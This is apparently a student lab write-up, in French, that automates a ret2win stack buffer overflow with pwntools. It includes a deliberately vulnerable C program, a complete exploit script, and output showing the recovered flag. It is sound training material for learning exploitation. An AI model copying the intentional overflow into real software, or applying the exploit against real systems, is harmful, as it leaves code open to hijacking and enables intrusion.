# Write-up — Lab 03 : pwntools — Exploit automatisé

> **Pilier 3 — Embarqué / C-ASM x86-64**
> Ngagne Demba Dia · AngeVirusLab · Shadow Bytes Red Team · UCAD · 2026

[![pwntools](https://img.shields.io/badge/pwntools-4.x-blue.svg)]()
[![ret2win](https://img.shields.io/badge/technique-ret2win-orange.svg)]()
[![Solved](https://img.shields.io/badge/Lab-Solved-brightgreen.svg)]()

---

## 1. TL;DR

**Objectif :** Automatiser le ret2win du Lab 02 avec pwntools  
**Nouveauté :** `ELF()` résout l'adresse automatiquement — `p64()` gère le little-endian — `process()` gère l'IO  
**Flag :** `AngeVirus{pwntools_ret2win_success}`

---

## 2. Environnement

```text
OS       : WSL2 Ubuntu sur Windows 11 Pro
pwntools : pip install pwntools
gcc      : -g -fno-stack-protector -z execstack -no-pie
```

**checksec :**

```
Arch:   amd64-64-little
RELRO:  Partial RELRO
Stack:  No canary found
NX:     NX unknown (Stack Executable)
PIE:    No PIE (0x400000)
```

---

## 3. Code source — `target.c`

```c
#include <stdio.h>
#include <unistd.h>

void win() {
    printf(">>> FLAG : AngeVirus{pwntools_ret2win_success} <<<\n");
}

void vulnerable() {
    char buffer[64];
    printf("Input : ");
    fflush(stdout);
    read(0, buffer, 200);  // overflow volontaire : 200 > 64
}

int main() {
    vulnerable();
    return 0;
}
```

Différence clé avec Lab 02 : `win()` n'affiche pas son adresse. pwntools la trouve seul via les symboles ELF.

---

## 4. Script pwntools — `exploit.py`

```python
from pwn import *

elf = ELF('./target')
context.binary = elf
context.log_level = 'info'

OFFSET = 72  # buffer(64) + saved RBP(8)

win_addr = elf.symbols['win']
log.info(f"Adresse de win() : {hex(win_addr)}")

payload  = b'A' * OFFSET
payload += p64(win_addr)

p = process('./target')
p.recvuntil(b'Input : ')
p.send(payload)

output = p.recvall(timeout=2)
log.success(output.decode(errors='replace'))
```

---

## 5. Ce que pwntools apporte vs Lab 02

| Lab 02 — manuel | Lab 03 — pwntools |
| --- | --- |
| Adresse lue dans le terminal au runtime | `elf.symbols['win']` — extraite du binaire |
| `\x96\x11\x40\x00\x00\x00\x00\x00` à la main | `p64(win_addr)` — little-endian automatique |
| `python3 -c "..." \| ./vuln2` | `process()` + `recvuntil()` + `send()` |
| One-liner non réutilisable | Script structuré, adaptable à tout binaire |

---

## 6. Exécution

```bash
python3 exploit.py
```

**Output :**

```
[*] Adresse de win() : 0x401196
[*] Payload : 72 octets padding + 0x401196 en little-endian
[+] Starting local process './target': pid 3504
[+] Receiving all data: Done (51B)
[*] Process './target' stopped with exit code -11 (SIGSEGV)
[+] >>> FLAG : AngeVirus{pwntools_ret2win_success} <<<
```

> Screenshot : [docs/lab03_pwntools_exploit.png](docs/lab03_pwntools_exploit.png)

Le SIGSEGV final est attendu — même cause qu'en Lab 02 : `win()` tente de retourner sur une pile corrompue.

---

## 7. API pwntools utilisée

| Fonction | Rôle |
| --- | --- |
| `ELF('./target')` | Charge et parse le binaire ELF |
| `elf.symbols['win']` | Résout l'adresse d'un symbole depuis la table ELF |
| `p64(addr)` | Encode une adresse en little-endian 64-bit |
| `process('./target')` | Lance le binaire comme sous-processus |
| `p.recvuntil(b'...')` | Lit jusqu'à un pattern attendu |
| `p.send(payload)` | Envoie le payload (octets bruts, sans `\n`) |
| `p.recvall(timeout=2)` | Lit toute la sortie restante |
| `log.info()` / `log.success()` | Logging coloré avec niveau |

---

## Résumé technique

| Élément | Valeur |
| --- | --- |
| Vulnérabilité | Stack buffer overflow (read sans limite) |
| Offset RIP | 72 octets |
| Adresse cible | `win()` = `0x401196` (via `elf.symbols`) |
| Technique | ret2win automatisé avec pwntools |
| Flag | `AngeVirus{pwntools_ret2win_success}` |

---

*Ngagne Demba Dia · AngeVirusLab · Shadow Bytes Red Team · UCAD · Dakar, 2026*
